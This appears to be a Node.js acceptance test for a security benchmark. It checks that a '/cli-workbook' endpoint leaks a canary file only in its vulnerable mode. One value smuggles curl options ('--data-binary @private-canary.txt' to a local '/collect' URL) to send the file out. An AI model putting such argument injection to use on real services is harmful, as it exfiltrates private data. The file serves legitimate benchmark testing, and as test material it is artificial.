import assert from 'node:assert/strict';

const key=process.env.BENCHMARK_CONTROL_KEY;
if(!key)throw Error('BENCHMARK_CONTROL_KEY is required');
const control=process.env.CONTROL_URL||'http://app:8099';
const target=process.env.TARGET_URL||'https://app:8443';
async function ctl(path,body){
  const response=await fetch(control+path,{method:body?'POST':'GET',headers:{'x-benchmark-key':key,'content-type':'application/json'},...(body?{body:JSON.stringify(body)}:{})});
  assert.equal(response.status,200);return response.json();
}
const normal='http://127.0.0.1:8091/public';
const attack='--data-binary @private-canary.txt http://127.0.0.1:8091/collect';
for(const mode of ['V','F','N']){
  const manifest=await ctl('/reset',{root:'R0076',variant:'B0080',mode,seed:'cli-http-acceptance-v1'});
  const cookies=[];
  async function send(path,body){
    const response=await fetch(target+manifest.base+path,{method:'POST',headers:{'content-type':'application/json',...(cookies.length?{cookie:cookies.join('; ')}:{})},body:JSON.stringify(body)});
    const set=response.headers.get('set-cookie');if(set)cookies.push(set.split('; ')[0]);
    return response;
  }
  assert.equal((await send('/login',{username:'alice',password:'Fixture-alice-2026!'})).status,200);
  const normalResponse=await send('/cli-workbook',{value:normal});
  assert.equal(normalResponse.status,200);
  const normalBody=await normalResponse.json();
  assert.match(normalBody.output,/Public HTTP fixture/);
  assert.equal(normalBody.sentSecret,false);
  const attackResponse=await send('/cli-workbook',{value:attack});
  assert.equal(attackResponse.status,mode==='V'?200:400);
  if(mode==='V')assert.equal((await attackResponse.json()).sentSecret,true);
  const records=(await ctl('/oracle')).caseState.batch6Cli.records;
  assert.equal(records.at(-1).sentSecret,mode==='V');
  console.log(JSON.stringify({variant:'B0080',mode,result:'passed',sentSecret:records.at(-1).sentSecret}));
}
